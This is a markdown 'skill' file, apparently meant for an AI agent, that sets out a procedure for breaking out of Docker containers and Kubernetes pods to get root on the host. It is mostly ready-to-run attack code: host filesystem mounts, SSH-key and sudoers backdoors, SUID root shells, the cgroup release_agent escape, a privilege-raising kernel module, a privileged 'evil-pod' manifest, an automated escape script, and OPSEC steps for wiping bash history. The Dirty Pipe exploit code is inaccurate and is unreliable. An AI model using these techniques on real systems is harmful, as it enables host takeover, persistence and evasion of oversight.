---
name: docker-container-escape
description: Break out of Docker containers to host system root access
version: 1.0.0
author: harezadmm
tags: [docker, container-escape, privilege-escalation, devops, kubernetes]
---

# Docker Container Escape

## When to Use
Breaking out of Docker containers to gain root access on the host system. Useful for privilege escalation during pentests or red team engagements.

## Prerequisites
- Shell access inside a Docker container
- Basic Linux knowledge
- Understanding of Docker architecture
- Target system runs Docker

## Attack Vectors

### 1. Privileged Container
Container running with `--privileged` flag has full host access.

### 2. Exposed Docker Socket
Mounted `/var/run/docker.sock` allows Docker API access.

### 3. Capabilities Abuse
Dangerous capabilities like `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`.

### 4. Kernel Exploits
Dirty Cow, DirtyCred, eBPF vulnerabilities.

### 5. Misconfigured Volumes
Host filesystem mounted inside container.

### 6. PID Namespace Escape
Breaking out via process namespace manipulation.

## Procedure

### Step 1: Reconnaissance Inside Container

**Check if container is privileged:**
```bash
# Inside container
ip link add dummy0 type dummy
# If this works, you're privileged

# Check capabilities
capsh --print
grep Cap /proc/self/status

# Check for docker socket
ls -la /var/run/docker.sock

# Check mounted filesystems
mount | grep -i docker
df -h

# Check hostname (often reveals container ID)
hostname
cat /etc/hostname

# Check cgroups (confirms containerization)
cat /proc/1/cgroup

# Check AppArmor/SELinux
cat /proc/self/attr/current
aa-status

# Check user
id
whoami

# Check processes
ps aux

# Check for kubernetes
ls -la /var/run/secrets/kubernetes.io/
```

### Step 2: Privileged Container Escape

**Method: Mount host filesystem**
```bash
# Inside privileged container
mkdir /mnt/host
mount /dev/sda1 /mnt/host  # Or /dev/vda1, /dev/xvda1 depending on system

# Now you have full host filesystem access
ls /mnt/host/root
ls /mnt/host/etc/shadow

# Add SSH key for persistence
mkdir -p /mnt/host/root/.ssh
echo "ssh-rsa AAAA... attacker@evil" >> /mnt/host/root/.ssh/authorized_keys
chmod 600 /mnt/host/root/.ssh/authorized_keys

# Or create SUID shell
cp /bin/bash /mnt/host/tmp/rootshell
chmod 4755 /mnt/host/tmp/rootshell

# Exit container and SSH to host
ssh root@host_ip

# Or execute from host: /tmp/rootshell -p
```

**Alternative: chroot escape**
```bash
# Inside privileged container
mkdir /mnt/host
mount -t proc none /proc
mount --bind /proc/sys /mnt/host

# Find host PID namespace
PID=$(cat /proc/sys/kernel/ns_last_pid)

# Break into host namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### Step 3: Docker Socket Escape

**Check if socket is mounted:**
```bash
ls -la /var/run/docker.sock
# If exists, you can control Docker as root
```

**Method 1: Spawn privileged container**
```bash
# Install docker CLI inside container (if not present)
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh

# Or use static binary
wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz
tar xzvf docker-20.10.9.tgz
cp docker/docker /usr/local/bin/

# List containers
docker ps

# Spawn new privileged container with host filesystem mounted
docker run -it --privileged --net=host --pid=host --ipc=host \
  --volume /:/host \
  alpine chroot /host bash

# You're now root on host
```

**Method 2: Escape via existing container**
```bash
# Get container ID
CONTAINER_ID=$(docker ps -q | head -1)

# Execute command on host via docker exec
docker exec -it $CONTAINER_ID bash

# Or create backdoor
docker exec $CONTAINER_ID bash -c 'echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
```

**Method 3: Python script**
```python
#!/usr/bin/env python3
import docker
import base64

client = docker.from_env()

# Spawn privileged container with host root mounted
container = client.containers.run(
    "alpine",
    command="chroot /host bash -c 'cp /bin/bash /tmp/rootshell && chmod 4755 /tmp/rootshell'",
    volumes={'/': {'bind': '/host', 'mode': 'rw'}},
    privileged=True,
    detach=False,
    remove=True
)

print("[+] SUID shell created at /tmp/rootshell on host")
print("[+] Execute: /tmp/rootshell -p")
```

### Step 4: Capabilities Abuse

**CAP_SYS_ADMIN Escape:**
```bash
# Check capabilities
capsh --print | grep sys_admin

# If CAP_SYS_ADMIN present:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Payload to execute on host
cat > /cmd << EOF
#!/bin/sh
cp /bin/bash /tmp/rootshell
chmod 4755 /tmp/rootshell
EOF

chmod +x /cmd

# Trigger execution on host
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# SUID shell created on host at /tmp/rootshell
```

**CAP_SYS_PTRACE + CAP_SYS_MODULE:**
```bash
# Inject malicious kernel module
# Create kernel module that gives root shell
cat > rootshell.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int __init rootshell_init(void) {
    struct cred *cred = prepare_creds();
    cred->uid.val = cred->gid.val = 0;
    cred->euid.val = cred->egid.val = 0;
    cred->suid.val = cred->sgid.val = 0;
    cred->fsuid.val = cred->fsgid.val = 0;
    commit_creds(cred);
    return 0;
}

static void __exit rootshell_exit(void) {}

module_init(rootshell_init);
module_exit(rootshell_exit);
MODULE_LICENSE("GPL");
EOF

# Compile and insert
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod rootshell.ko

# You're now root
```

### Step 5: Kernel Exploit (Dirty Pipe)

**CVE-2022-0847 - Dirty Pipe:**
```c
// dirtypipe.c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    int pipe_fd[2];
    pipe(pipe_fd);
    
    // Overwrite /etc/passwd to add root user
    int fd = open("/etc/passwd", O_RDONLY);
    
    // Splice file into pipe
    splice(fd, NULL, pipe_fd[1], NULL, 1, 0);
    
    // Write malicious data into pipe
    char *payload = "hacker::0:0::/root:/bin/bash\n";
    write(pipe_fd[1], payload, strlen(payload));
    
    // Splice back into file (overwrites data)
    lseek(fd, 0, SEEK_SET);
    splice(pipe_fd[0], NULL, fd, NULL, strlen(payload), 0);
    
    close(fd);
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    
    printf("[+] /etc/passwd overwritten\n");
    printf("[+] Login with: su hacker\n");
    
    return 0;
}
```

**Compile and run:**
```bash
gcc dirtypipe.c -o dirtypipe
./dirtypipe

# Switch to root
su hacker
# No password needed
```

### Step 6: Kubernetes Pod Escape

**Check if in Kubernetes:**
```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/
# If exists, you're in a k8s pod

# Get service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

# List pods
curl -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# Create privileged pod
cat > evil-pod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Deploy via kubectl (if available)
kubectl apply -f evil-pod.yaml
kubectl exec -it evil-pod -- /bin/sh

# You're now on host with full access
```

### Step 7: Automated Escape Scripts

**All-in-one escape script:**
```bash
#!/bin/bash
# docker-escape.sh

echo "[*] Docker Container Escape Tool"
echo "[*] Checking escape vectors..."

# Check if privileged
if ip link add dummy0 type dummy 2>/dev/null; then
    echo "[+] Container is PRIVILEGED"
    ip link delete dummy0
    
    echo "[*] Mounting host filesystem..."
    mkdir -p /mnt/host
    
    # Try different devices
    for dev in /dev/sda1 /dev/vda1 /dev/xvda1 /dev/nvme0n1p1; do
        if [ -b "$dev" ]; then
            mount $dev /mnt/host 2>/dev/null
            if [ $? -eq 0 ]; then
                echo "[+] Mounted $dev at /mnt/host"
                
                # Create SUID shell
                cp /bin/bash /mnt/host/tmp/.rootshell
                chmod 4755 /mnt/host/tmp/.rootshell
                
                echo "[+] SUID shell created at /tmp/.rootshell on host"
                echo "[+] Execute: /tmp/.rootshell -p"
                exit 0
            fi
        fi
    done
fi

# Check for docker socket
if [ -S /var/run/docker.sock ]; then
    echo "[+] Docker socket found at /var/run/docker.sock"
    
    # Check if docker binary exists
    if ! command -v docker &> /dev/null; then
        echo "[*] Installing docker CLI..."
        wget -q https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz
        tar xzf docker-20.10.9.tgz
        cp docker/docker /usr/local/bin/
        chmod +x /usr/local/bin/docker
    fi
    
    echo "[*] Spawning privileged container..."
    docker run -it --rm --privileged --net=host --pid=host \
      --volume /:/host \
      alpine chroot /host bash
    
    exit 0
fi

# Check for CAP_SYS_ADMIN
if capsh --print | grep -q cap_sys_admin; then
    echo "[+] CAP_SYS_ADMIN capability detected"
    echo "[*] Attempting cgroup escape..."
    
    mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
    mkdir /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    
    host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    
    cat > /cmd << 'EOF'
#!/bin/sh
cp /bin/bash /tmp/.rootshell
chmod 4755 /tmp/.rootshell
EOF
    
    chmod +x /cmd
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    
    echo "[+] Escape triggered, SUID shell at /tmp/.rootshell on host"
    exit 0
fi

echo "[-] No escape vector found"
echo "[*] Try kernel exploits (Dirty COW, Dirty Pipe, etc.)"
```

## Pitfalls

**Host device detection**: `/dev/sda1` might be `/dev/vda1` on VMs or `/dev/nvme0n1p1` on NVMe.

**AppArmor/SELinux**: Can block escape attempts. Check with `aa-status` or `getenforce`.

**Read-only filesystems**: Some containers mount `/` as read-only.

**Network isolation**: Container might not have internet for downloading tools.

**Audit logging**: Host may log container escapes in `/var/log/audit/`.

## Verification

```bash
# Verify you're on host
cat /proc/1/cgroup
# Should show root cgroup, not docker/kubepods

# Check hostname
hostname
# Should be host hostname, not container ID

# Check processes
ps aux | grep dockerd
# Should see dockerd running

# Verify root
id
# uid=0(root) gid=0(root) groups=0(root)

# Check filesystem
ls /home
# Should see actual host users
```

## OPSEC

- Clean up created files (`/tmp/rootshell`, `/cmd`, etc.)
- Remove created containers: `docker rm -f <container>`
- Clear bash history: `history -c && rm ~/.bash_history`
- Check audit logs: `ausearch -m CONTAINER_OP`
- Unmount filesystems: `umount /mnt/host`
- Remove kernel modules: `rmmod rootshell`

## References

- Docker security best practices
- Kubernetes security hardening
- Linux capabilities documentation
- CVE-2022-0847 (Dirty Pipe)
- Felix Wilhelm container escape research
- Trail of Bits container security
